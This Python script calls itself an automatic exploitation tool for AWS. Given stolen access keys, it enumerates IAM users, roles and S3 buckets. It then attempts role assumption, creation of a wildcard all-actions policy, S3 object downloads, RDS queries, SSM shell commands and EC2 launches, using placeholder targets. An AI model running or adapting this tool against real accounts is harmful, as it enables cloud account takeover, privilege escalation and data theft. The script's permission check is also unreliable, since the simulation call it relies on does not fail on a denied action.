import boto3
import pymysql
import argparse
from datetime import datetime
from botocore.exceptions import NoCredentialsError, PartialCredentialsError, ClientError
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

REGIONS = [
    'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1',
    'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 'eu-central-1',
    'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1', 'eu-south-1', 'me-south-1', 'sa-east-1'
]

def print_separator(section_name):
    print(f"\n{Fore.YELLOW}{'=' * 40}")
    print(f"{Fore.YELLOW}{section_name}")
    print(f"{Fore.YELLOW}{'=' * 40}\n")

def whoami(sts_client):
    try:
        identity = sts_client.get_caller_identity()
        print_separator("WHOAMI")
        print(f"{Fore.CYAN}Current Identity:")
        print(f"{Fore.CYAN}Account: {identity['Account']}")
        print(f"{Fore.CYAN}UserId: {identity['UserId']}")
        print(f"{Fore.CYAN}Arn: {identity['Arn']}")
    except Exception as e:
        print(f"{Fore.RED}Error retrieving identity: {e}")

def list_iam_users(iam_client):
    try:
        response = iam_client.list_users()
        users = response['Users']
        print_separator("IAM USERS")
        if users:
            for user in users:
                print(f"{Fore.GREEN}UserName: {user['UserName']}, UserId: {user['UserId']}, Arn: {user['Arn']}")
        else:
            print(f"{Fore.CYAN}No IAM users found.")
    except Exception as e:
        print(f"{Fore.RED}Error listing IAM users: {e}")

def list_iam_roles(iam_client):
    try:
        response = iam_client.list_roles()
        roles = response['Roles']
        print_separator("IAM ROLES")
        if roles:
            for role in roles:
                print(f"{Fore.GREEN}RoleName: {role['RoleName']}, RoleId: {role['RoleId']}, Arn: {role['Arn']}")
        else:
            print(f"{Fore.CYAN}No IAM roles found.")
    except Exception as e:
        print(f"{Fore.RED}Error listing IAM roles: {e}")

def list_s3_buckets(s3_client):
    try:
        response = s3_client.list_buckets()
        buckets = response['Buckets']
        print_separator("S3 BUCKETS")
        if buckets:
            for bucket in buckets:
                print(f"{Fore.GREEN}BucketName: {bucket['Name']}")
        else:
            print(f"{Fore.CYAN}No S3 buckets found.")
    except Exception as e:
        print(f"{Fore.RED}Error listing S3 buckets: {e}")

def assume_role(sts_client, role_arn, session_name):
    try:
        response = sts_client.assume_role(
            RoleArn=role_arn,
            RoleSessionName=session_name
        )
        credentials = response['Credentials']
        print_separator("ASSUME ROLE")
        print(f"{Fore.CYAN}Assumed role: {role_arn}")
        return credentials
    except Exception as e:
        print(f"{Fore.RED}Error assuming role: {e}")

def create_policy(iam_client, policy_name, policy_document):
    try:
        response = iam_client.create_policy(
            PolicyName=policy_name,
            PolicyDocument=policy_document
        )
        print_separator("CREATE POLICY")
        print(f"{Fore.CYAN}Created policy: {response['Policy']['Arn']}")
        return response['Policy']['Arn']
    except Exception as e:
        print(f"{Fore.RED}Error creating policy: {e}")

def list_s3_objects(s3_client, bucket_name):
    try:
        response = s3_client.list_objects_v2(Bucket=bucket_name)
        print_separator(f"S3 OBJECTS IN BUCKET: {bucket_name}")
        if 'Contents' in response:
            for obj in response['Contents']:
                print(f"{Fore.GREEN}Found object: {obj['Key']}")
        else:
            print(f"{Fore.CYAN}No objects found.")
    except Exception as e:
        print(f"{Fore.RED}Error listing S3 objects: {e}")

def download_s3_object(s3_client, bucket_name, object_key, download_path):
    try:
        s3_client.download_file(bucket_name, object_key, download_path)
        print_separator("DOWNLOAD S3 OBJECT")
        print(f"{Fore.CYAN}Downloaded {object_key} to {download_path}")
    except Exception as e:
        print(f"{Fore.RED}Error downloading S3 object: {e}")

def query_rds_instance(endpoint, username, password, dbname, query):
    try:
        connection = pymysql.connect(
            host=endpoint,
            user=username,
            password=password,
            database=dbname
        )
        with connection:
            with connection.cursor() as cursor:
                cursor.execute(query)
                result = cursor.fetchall()
                print_separator("RDS QUERY RESULT")
                if result:
                    for row in result:
                        print(f"{Fore.GREEN}{row}")
                else:
                    print(f"{Fore.CYAN}No results found.")
    except Exception as e:
        print(f"{Fore.RED}Error querying RDS instance: {e}")

def send_command(ssm_client, instance_ids, commands):
    try:
        response = ssm_client.send_command(
            InstanceIds=instance_ids,
            DocumentName='AWS-RunShellScript',
            Parameters={'commands': commands}
        )
        print_separator("SSM COMMAND")
        print(f"{Fore.CYAN}Sent command to instances: {instance_ids}")
    except Exception as e:
        print(f"{Fore.RED}Error sending command: {e}")

def create_ec2_instance(ec2_client, image_id, instance_type, key_name):
    try:
        response = ec2_client.run_instances(
            ImageId=image_id,
            InstanceType=instance_type,
            KeyName=key_name,
            MinCount=1,
            MaxCount=1
        )
        print_separator("CREATE EC2 INSTANCE")
        print(f"{Fore.CYAN}Launched instance: {response['Instances'][0]['InstanceId']}")
    except Exception as e:
        print(f"{Fore.RED}Error launching EC2 instance: {e}")

def get_cloudtrail_events(cloudtrail_client, start_time, end_time):
    try:
        response = cloudtrail_client.lookup_events(
            StartTime=start_time,
            EndTime=end_time
        )
        print_separator("CLOUDTRAIL EVENTS")
        if response['Events']:
            for event in response['Events']:
                print(f"{Fore.GREEN}Event: {event}")
        else:
            print(f"{Fore.CYAN}No events found.")
    except Exception as e:
        print(f"{Fore.RED}Error getting CloudTrail events: {e}")

def get_cloudwatch_logs(logs_client, log_group_name, start_time, end_time):
    try:
        response = logs_client.filter_log_events(
            logGroupName=log_group_name,
            startTime=int(start_time.timestamp() * 1000),
            endTime=int(end_time.timestamp() * 1000)
        )
        print_separator(f"CLOUDWATCH LOGS IN GROUP: {log_group_name}")
        if response['events']:
            for event in response['events']:
                print(f"{Fore.GREEN}Log event: {event}")
        else:
            print(f"{Fore.CYAN}No log events found.")
    except Exception as e:
        print(f"{Fore.RED}Error getting CloudWatch logs: {e}")

def check_permissions(iam_client, actions, arn):
    try:
        for action in actions:
            try:
                iam_client.simulate_principal_policy(
                    PolicySourceArn=arn,
                    ActionNames=[action]
                )
                print(f"{Fore.CYAN}Permission granted for action: {action}")
            except Exception:
                print(f"{Fore.RED}Permission denied for action: {action}")
                return False
        return True
    except Exception as e:
        print(f"{Fore.RED}Error checking permissions: {e}")
        return False

def try_regions(access_key, secret_key):
    for region in REGIONS:
        try:
            session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region
            )
            sts_client = session.client('sts')
            sts_client.get_caller_identity()
            print(f"{Fore.GREEN}Successfully authenticated in region: {region}")
            return region
        except ClientError as e:
            print(f"{Fore.RED}Failed to authenticate in region: {region}")
    return None

if __name__ == "__main__":
    print(f"""{Fore.LIGHTMAGENTA_EX} 

 █████  ██     ██ ███████         ██████  ██████  ███████  █████   ██████ ██   ██ 
██   ██ ██     ██ ██              ██   ██ ██   ██ ██      ██   ██ ██      ██   ██ 
███████ ██  █  ██ ███████         ██████  ██████  █████   ███████ ██      ███████ 
██   ██ ██ ███ ██      ██         ██   ██ ██   ██ ██      ██   ██ ██      ██   ██ 
██   ██  ███ ███  ███████ ███████ ██████  ██   ██ ███████ ██   ██  ██████ ██   ██ 
{Style.RESET_ALL}----------------- {Fore.RED}automatic {Fore.YELLOW}exploitation {Fore.GREEN}tool {Fore.BLUE}for {Fore.CYAN}AWS {Fore.MAGENTA}by Mr r00t {Style.RESET_ALL}-----------------\n
""")
    parser = argparse.ArgumentParser(description='AWS Operations Script')
    parser.add_argument('--access_key', required=True, help='AWS Access Key')
    parser.add_argument('--secret_key', required=True, help='AWS Secret Key')
    parser.add_argument('--region', help='AWS Region')

    args = parser.parse_args()

    region = args.region if args.region else try_regions(args.access_key, args.secret_key)

    if not region:
        print(f"{Fore.RED}Failed to authenticate in any region. Exiting.")
        exit(1)

    session = boto3.Session(
        aws_access_key_id=args.access_key,
        aws_secret_access_key=args.secret_key,
        region_name=region
    )

    iam_client = session.client('iam')
    s3_client = session.client('s3')
    sts_client = session.client('sts')
    ssm_client = session.client('ssm')
    ec2_client = session.client('ec2')
    cloudtrail_client = session.client('cloudtrail')
    logs_client = session.client('logs')

    arn = sts_client.get_caller_identity()['Arn']

    # Whoami - Print current identity
    whoami(sts_client)

    list_iam_users(iam_client)
    list_iam_roles(iam_client)
    list_s3_buckets(s3_client)

    # Check permissions and execute advanced functions
    if check_permissions(iam_client, ['sts:AssumeRole'], arn):
        credentials = assume_role(sts_client, 'arn:aws:iam::123456789012:role/example-role', 'example-session')

    if check_permissions(iam_client, ['iam:CreatePolicy'], arn):
        policy_document = '{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
        create_policy(iam_client, 'example-policy', policy_document)

    if check_permissions(iam_client, ['s3:ListBucket', 's3:GetObject'], arn):
        list_s3_objects(s3_client, 'example-bucket')
        download_s3_object(s3_client, 'example-bucket', 'example-object', 'downloaded-object')

    if check_permissions(iam_client, ['rds:DescribeDBInstances'], arn):
        query_rds_instance('example-endpoint', 'username', 'password', 'dbname', 'SELECT * FROM example_table')

    if check_permissions(iam_client, ['ssm:SendCommand'], arn):
        send_command(ssm_client, ['i-1234567890abcdef0'], ['echo Hello World'])

    if check_permissions(iam_client, ['ec2:RunInstances'], arn):
        create_ec2_instance(ec2_client, 'ami-12345678', 't2.micro', 'example-key')

    if check_permissions(iam_client, ['cloudtrail:LookupEvents'], arn):
        get_cloudtrail_events(cloudtrail_client, datetime(2023, 1, 1), datetime(2023, 1, 31))

    if check_permissions(iam_client, ['logs:FilterLogEvents'], arn):
        get_cloudwatch_logs(logs_client, 'example-log-group', datetime(2023, 1, 1), datetime(2023, 1, 31))
